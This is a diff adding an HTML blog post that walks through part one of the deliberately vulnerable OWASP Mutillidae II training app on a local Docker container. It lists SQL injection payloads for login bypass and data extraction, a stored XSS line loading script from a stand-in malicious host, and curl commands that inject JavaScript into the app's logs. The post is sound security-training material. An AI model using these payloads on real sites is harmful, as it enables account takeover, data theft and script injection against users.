@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='Learning web app secuiry with OWASP Mutillidae II - part 1 iNSTALLATION Run nowasp container:
+docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp  Go to http://localhost:8888/, and build the DB.
+eXCERCICES: OWASP 2013 A1 - Injection (SQL) - SQLi Extract data - User info Submit the form with such query in the Name field:
+admin&#39;-- AND &#39;password=&#39;password&#39;  Response:
+Username=admin Password=adminpass Signature=g0t r00t?  A1 - Injection (SQL) - SQLi Bypass authentication - Login You can use the same query in the Name field:'>
+
+<meta property='og:title' content='Learning web app secuiry with OWASP Mutillidae II - part 1 • kowalcj0'>
+<meta property='og:description' content='Learning web app secuiry with OWASP Mutillidae II - part 1 iNSTALLATION Run nowasp container:
+docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp  Go to http://localhost:8888/, and build the DB.
+eXCERCICES: OWASP 2013 A1 - Injection (SQL) - SQLi Extract data - User info Submit the form with such query in the Name field:
+admin&#39;-- AND &#39;password=&#39;password&#39;  Response:
+Username=admin Password=adminpass Signature=g0t r00t?  A1 - Injection (SQL) - SQLi Bypass authentication - Login You can use the same query in the Name field:'>
+<meta property='og:url' content='https://kowalcj0.github.io/post/2017/mutillidae-ii-part-1/'>
+<meta property='og:site_name' content='kowalcj0'>
+<meta property='og:type' content='article'><meta property='og:image' content='https://kowalcj0.github.io/img/2017/002/owasp_full_logo.png'><meta property='article:section' content='Post'><meta property='article:tag' content='security'><meta property='article:tag' content='owasp'><meta property='article:tag' content='mutillidae'><meta property='article:tag' content='pentesting'><meta property='article:published_time' content='2018-01-23T14:41:50&#43;01:00'/><meta property='article:modified_time' content='2018-01-23T14:41:50&#43;01:00'/><meta name='twitter:card' content='summary_large_image'><meta property='twitter:image' content='https://kowalcj0.github.io/img/2017/002/owasp_full_logo.png'><meta property='twitter:image:alt' content='OWASP logo'>
+
+<meta name="generator" content="Hugo 0.34" />
+
+  <title>Learning web app secuiry with OWASP Mutillidae II - part 1 • kowalcj0</title>
+  <link rel='canonical' href='https://kowalcj0.github.io/post/2017/mutillidae-ii-part-1/'>
+  
+  
+  <link rel='icon' href='/img/favicon144.ico'>
+<link rel='stylesheet' href='/assets/css/main.f0e8df71.css'><link rel='stylesheet' href='/css/prism.css'>
+</head>
+
+
+<body class='page type-post hasCover'>
+  <div class='site'>
+
+    <a class='screen-reader' href='#main'>Skip to Content</a>
+
+    <header id='header' class='header-container'>
+      <div class='header site-header'>
+        <nav id='main-menu' class='main-menu-container' aria-label='Main Menu'>
+  <ul class='main-menu'>
+  <li>
+      <a href='/'>Home</a>
+    </li>
+  <li>
+      <a href='https://github.com/kowalcj0/kowalcj0.github.io'>Repo</a>
+    </li>
+  
+  </ul>
+</nav>
+
+        <div class='header-info'>
+          
+          <p class='site-title title'>kowalcj0</p>
+          
+          <p class='site-description subtitle'>kowalcj0&#39;s blog</p>
+        </div>
+      </div>
+    </header>
+
+
+<main id='main' class='main'>
+  <article lang='en' class='entry'>
+    <header class='header-container'>
+  <div class='header entry-header'>
+    <div class='header-info'>
+      <h1 class='title'>Learning web app secuiry with OWASP Mutillidae II - part 1</h1>
+      
+
+    </div>
+    
+<div class='meta'>
+  <span class='posted-on'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+  <line x1="16" y1="2" x2="16" y2="6"/>
+  <line x1="8" y1="2" x2="8" y2="6"/>
+  <line x1="3" y1="10" x2="21" y2="10"/>
+  
+</svg>
+<span class='screen-reader'>Posted on </span>
+  <time class='date' datetime='2018-01-23T14:41:50&#43;01:00'>2018-09-14</time>
+</span>
+
+  
+  
+<span class='reading-time'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <circle cx="12" cy="12" r="10"/>
+  <polyline points="12 6 12 12 15 15"/>
+  
+</svg>
+2 mins read
+</span>
+
+
+</div>
+
+
+  </div>
+</header>
+
+    <div class='entry-cover-container'>
+  <figure class='entry-cover cover-normal'>
+    <img src='/img/2017/002/owasp_full_logo.png' alt='OWASP logo'/>
+    
+      
+      <figcaption>
+        <span>OWASP logo</span>
+      </figcaption>
+      
+    
+  </figure>
+</div>
+    
+
+    <div class='entry-content'>
+  
+
+<h2 id="learning-web-app-secuiry-with-owasp-mutillidae-ii-part-1">Learning web app secuiry with OWASP Mutillidae II - part 1</h2>
+
+<h1 id="installation">iNSTALLATION</h1>
+
+<p>Run <code>nowasp</code> container:</p>
+
+<pre><code>docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp
+</code></pre>
+
+<p>Go to <a href="http://localhost:8888/" target="_blank">http://localhost:8888/</a>, and build the DB.</p>
+
+<h1 id="excercices">eXCERCICES:</h1>
+
+<h2 id="owasp-2013">OWASP 2013</h2>
+
+<h3 id="a1-injection-sql-sqli-extract-data-user-info">A1 - Injection (SQL) - SQLi Extract data - User info</h3>
+
+<p>Submit the form with such query in the <code>Name</code> field:</p>
+
+<pre><code>admin'-- AND 'password='password'
+</code></pre>
+
+<p>Response:</p>
+
+<pre><code>Username=admin
+Password=adminpass
+Signature=g0t r00t?
+</code></pre>
+
+<h3 id="a1-injection-sql-sqli-bypass-authentication-login">A1 - Injection (SQL) - SQLi Bypass authentication - Login</h3>
+
+<p>You can use the same query in the <code>Name</code> field:</p>
+
+<pre><code>admin'-- AND 'password='password'
+</code></pre>
+
+<p>Response:</p>
+
+<pre><code>Logged In Admin: admin (g0t r00t?)
+</code></pre>
+
+<h3 id="a1-injection-sql-sqli-insert-injection-add-to-your-blog">A1 - Injection (SQL) - SQLi Insert Injection - Add to your blog</h3>
+
+<p><em>Stored Cross-Site Scripting</em></p>
+
+<pre><code>&lt;script src=&quot;http://malicious.site.com/bad.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p>Once saved, check your browser&rsquo;s Network requests using e.g. Developer tools:</p>
+
+<div class="gallery" itemscope itemtype="http://schema.org/ImageGallery">
+
+<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <a href="/img/2017/002/OWASP-2013-A1-Add_to_your_blog-Stored_Cross-Site_Scripting.png" data-size="1311x204" itemprop="contentUrl"> 
+        <img itemprop="thumbnail"
+            src="/img/2017/002/OWASP-2013-A1-Add_to_your_blog-Stored_Cross-Site_Scripting-thumb.png"
+            alt="Stored Cross-Site Scripting"
+            />
+    </a>
+    
+    <figcaption>
+        
+        
+        <p>
+        Stored Cross-Site Scripting
+        
+        </p>
+        
+    </figcaption>
+    
+</figure>
+
+
+<div class="title">Stored Cross-Site Scripting</div>
+</div>
+<link rel="stylesheet" href="/css/pswp-gallery.css" />
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha256-rlldBDOCxqXAE1fRopHG2SqpgWisq17/3Oleo+1CBKo=" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha256-kQW7k22C0skJMSPxgEI2VHR0LPHeygi8SRYNvV/DB2w=" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha256-iG1tiE5xJSJQhKdeOW4cPiSy+RTrnRKjjjrVQ0hexug=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha256-XvSk6Opq7XZ8oUcx213MtikXtbl5bbe4Q9tr4+NJBCg=" crossorigin="anonymous"></script>
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+<script src="/js/pswp-init.js"></script>
+
+
+
+<p>get MySQL version:</p>
+
+<pre><code>'+SUBSTRING(@@version,1,10)+'
+</code></pre>
+
+<p>Red herrings: queries that don&rsquo;t fail but don&rsquo;t give much info back:</p>
+
+<pre><code>'+(SELECT IF(1=1,'true','false'))+'
+'+(SELECT password FROM accounts WHERE username=&quot;root&quot;)+'
+'+SUBSTRING((SELECT password FROM accounts WHERE username=&quot;root&quot;),1,10)+'
+'+(SELECT table_name FROM information_schema.tables WHERE table_schema = &quot;nowasp.accounts&quot;)+'
+'+(SELECT column_name FROM information_schema.columns WHERE table_schema = &quot;nowasp.accounts&quot;)+'
+'+SUBSTRING(SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = &quot;nowasp.accounts&quot;,1,50)+'
+'+SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&quot;accounts&quot;),1,50)+'
+aaa', now()); SELECT * FROM accounts; --
+aaa', IF(1=1,'true','false'));#
+aaa', IF(1=1, SELECT * FROM members, 'false'));#
+'+ (SELECT password FROM accounts WHERE login='admin' ) +'
+'+(SELECT password FROM members WHERE login=&quot;admin&quot;)+'
+'+(SELECT IF(1=1,'true','false'))+'
+admin'-- AND SELECT * FROM accounts;
+</code></pre>
+
+<h3 id="a1-injection-sql-sqli-insert-injection-register-for-an-account">A1 - Injection (SQL) - SQLi Insert Injection - Register for an Account</h3>
+
+<p>HTMLi -
+add this to the registration signature:</p>
+
+<pre><code class="language-html">&lt;CANARY={}&quot;&quot;()'';#$--/&gt;1
+</code></pre>
+
+<p>or simply add XSS</p>
+
+<pre><code>&lt;CANARY={}&quot;&quot;()'';#$--/&gt;&lt;script&gt;alert(&quot;welcome&quot;);&lt;/script&gt;
+</code></pre>
+
+<p>Then log in as newly created user and see that <code>1</code> is visible next to the user name in top menu:</p>
+
+<div class="gallery" itemscope itemtype="http://schema.org/ImageGallery">
+
+<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
+    <a href="/img/2017/002/OWASP-2013-A1-Add_to_your_blog-HTMLi.png" data-size="1419x559" itemprop="contentUrl"> 
+        <img itemprop="thumbnail"
+            src="/img/2017/002/OWASP-2013-A1-Add_to_your_blog-HTMLi-thumb.png"
+            alt="HTMLi"
+            />
+    </a>
+    
+    <figcaption>
+        
+        
+        <p>
+        HTMLi
+        
+        </p>
+        
+    </figcaption>
+    
+</figure>
+
+
+<div class="title">HTMLi</div>
+</div>
+<link rel="stylesheet" href="/css/pswp-gallery.css" />
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha256-rlldBDOCxqXAE1fRopHG2SqpgWisq17/3Oleo+1CBKo=" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha256-kQW7k22C0skJMSPxgEI2VHR0LPHeygi8SRYNvV/DB2w=" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha256-iG1tiE5xJSJQhKdeOW4cPiSy+RTrnRKjjjrVQ0hexug=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha256-XvSk6Opq7XZ8oUcx213MtikXtbl5bbe4Q9tr4+NJBCg=" crossorigin="anonymous"></script>
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+<script src="/js/pswp-init.js"></script>
+
+
+
+<h3 id="a1-injection-sql-sqli-insert-injection-view-captured-data">A1 - Injection (SQL) - SQLi Insert Injection - View Captured Data</h3>
+
+<p>Here&rsquo;s one of my favs:
+<em>Application Log Injection:</em>
+You can send a dummy HTTP request with <code>User-Agent</code> header containing JS:</p>
+
+<pre><code class="language-bash">curl http://localhost:8888/index.php?page=register.php -H &quot;User-Agent: &lt;script&gt;alert('pwnd with Application Log Injection');&lt;/script&gt;&quot;  &amp;&gt; /dev/null
+</code></pre>
+
+<p>or abuse the fact that the <code>endpoint</code> part of the URL is interpretted and logged so that we can include JS in it:</p>
+
+<pre><code class="language-bash">curl &quot;http://localhost:8888/&lt;script&gt;alert('query_param');&lt;/script&gt;&quot; &amp;&gt; /dev/null
+</code></pre>
+
+<p>Once you send the request, then go to the <a href="http://localhost:8888/index.php?page=show-log.php" target="_blank">http://localhost:8888/index.php?page=show-log.php</a> the alert pop-ups will appear.</p>
+
+<p><em>NOTES:</em></p>
+
+<ul>
+<li>can you create an account for <code>root</code> user???</li>
+</ul>
+
+<p><a href="http://localhost:8888/index.php?page=capture-data.php" target="_blank">http://localhost:8888/index.php?page=capture-data.php</a></p>
+
+<pre><code>curl http://localhost:8888/index.php?page=capture-data.php&amp;showhints=1 -H &quot;PHPSESSID: 5hdie94hhe7cc50pqsbvujqkb3&quot;
+</code></pre>
+
+</div>
+
+    
+<footer class='entry-footer-container'>
+  <div class='entry-footer'>
+  <div class='categories'>
+  <span class='taxonomyTerm-icon'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M22,19a2,2,0,0,1-2,2H4a2,2,0,0,1-2-2V5A2,2,0,0,1,4,3H9l2,3h9a2,2,0,0,1,2,2Z"/>
+  
+</svg>
+</span>
+  <span class='screen-reader'>Categories: </span><a class='category' href='/categories/others'>Others</a></div>
+<div class='tags'>
+  <span class='taxonomyTerm-icon'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z"/>
+  <line x1="7" y1="7" x2="7" y2="7"/>
+  
+</svg>
+</span>
+  <span class='screen-reader'>Tags: </span><a class='tag' href='/tags/security'>Security</a>, <a class='tag' href='/tags/owasp'>Owasp</a>, <a class='tag' href='/tags/mutillidae'>Mutillidae</a>, <a class='tag' href='/tags/pentesting'>Pentesting</a></div>
+
+  </div>
+</footer>
+
+
+  </article>
+  
+<nav class='entry-nav-container'>
+  <div class='entry-nav'><div class='prev-entry'>
+      <a href='/post/2017/beginning/'>
+        <span aria-hidden='true'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <line x1="20" y1="12" x2="4" y2="12"/>
+  <polyline points="10 18 4 12 10 6"/>
+  
+</svg>
+ Previous</span>
+        <span class='screen-reader'>Previous post: </span>The beginning</a>
+    </div></div>
+</nav>
+
+  
+</main>
+
+    <footer id='footer' class='footer-container'>
+      <div class='footer'>
+        <div class='social-menu-container'>
+  <nav aria-label='Social Menu'>
+    <ul class='social-menu'><li>
+        <a href='https://github.com/kowalcj0' target='_blank' rel='noopener'>
+          <span class='screen-reader'>Open Github account in new tab</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/>
+  
+</svg>
+</a>
+      </li><li>
+        <a href='https://twitter.com/januszkowalczyk' target='_blank' rel='noopener'>
+          <span class='screen-reader'>Open Twitter account in new tab</span><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"/>
+  
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</div>
+        <div class='copyright'>
+  <p>
+        
+          
+        
+      
+
+       &copy; 2017-2018 kowalcj0 
+  </p>
+</div>
+
+      </div>
+    </footer>
+
+  </div><script src='/assets/js/main.5871befd.js'></script><script src='/js/prism.js'></script><script src='/js/custom.js'></script></body>
+
+</html>
+
